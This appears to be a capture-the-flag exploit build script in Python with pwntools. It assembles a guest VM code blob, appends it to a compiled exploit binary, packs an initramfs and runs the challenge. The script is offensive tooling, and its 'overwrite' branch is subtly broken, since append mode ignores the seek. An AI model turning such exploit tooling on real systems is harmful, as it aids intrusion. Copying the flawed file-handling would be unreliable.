#!/usr/bin/env python3
import os
from os import system, execve
from pwn import *

context.arch = "amd64"

vm_code = f"""
mov rax, 0xDEADBEEF
mov rbx, 0
jmp $
mov cr0, rbx
mov rbx, 0x1234
"""

# Compile VM code and write its opcodes/bytes into "vm_code.h"
vm_code_asm = asm(vm_code)
vm_code_asm += asm('nop') * (0x1000 - len(vm_code_asm))

write("./exploit/vm_code", vm_code_asm)

if not os.path.exists("./unpacked/exploit"):
    # Compile the exploit.c
    subprocess.check_output("gcc -Werror -Wall -Wextra -static -Os ./exploit/exploit.c -o ./exploit/exploit_prefix", shell=True)

    data = read("./exploit/exploit_prefix")
    write("./unpacked/exploit", data + vm_code_asm)
else:
    # Overwrite last 0x1000 bytes of ./unpacked/exploit with VM code
    with open("./unpacked/exploit", "ab") as f:
        f.seek(-0x1000, 2)
        f.write(vm_code_asm)


# Copy the exploit and pack the initramfs
subprocess.check_output("./scripts/pack.sh", shell=True)

system("cd ../challenge && ./run.sh")

system("reset")
